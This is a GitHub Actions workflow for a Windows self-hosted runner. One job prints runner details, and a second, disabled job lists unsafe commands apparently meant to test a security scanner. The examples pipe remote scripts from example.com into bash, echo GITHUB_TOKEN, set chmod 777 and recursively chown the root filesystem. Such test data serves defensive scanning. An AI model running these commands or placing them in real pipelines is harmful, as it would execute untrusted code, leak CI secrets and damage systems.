name: Self Hosted Runner Test

on:
  workflow_dispatch:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main

jobs:
  test:
    runs-on: [self-hosted, Windows, X64]
    steps:
      - name: Print runner info
        shell: powershell
        run: |
          Write-Host "Hello from Windows self-hosted runner"
          Write-Host "Runner name: $env:RUNNER_NAME"
          Write-Host "Runner OS: $env:RUNNER_OS"
          Write-Host "Runner architecture: $env:RUNNER_ARCH"
          Write-Host "Event: $env:GITHUB_EVENT_NAME"
          Write-Host "Ref: $env:GITHUB_REF"
          Write-Host "SHA: $env:GITHUB_SHA"
          Write-Host "OS version: $([System.Environment]::OSVersion.VersionString)"
          Write-Host "Working directory: $((Get-Location).Path)"

          if ($env:RUNNER_OS -ne "Windows") {
            throw "Expected a Windows runner, but got '$env:RUNNER_OS'."
          }

  insecure-command-scan-test:
    runs-on: self-hosted
    if: ${{ false }}

    steps:
      - name: Unsafe command examples for scanner test
        run: |
          curl -fsSL https://example.com/install.sh | bash
          wget -qO- https://example.com/install.sh | sh
          chmod -R 777 .
          printenv
          echo "$GITHUB_TOKEN"
          sudo chown -R runner:runner /
          sudo rm -rf /tmp/scanner-test-directory
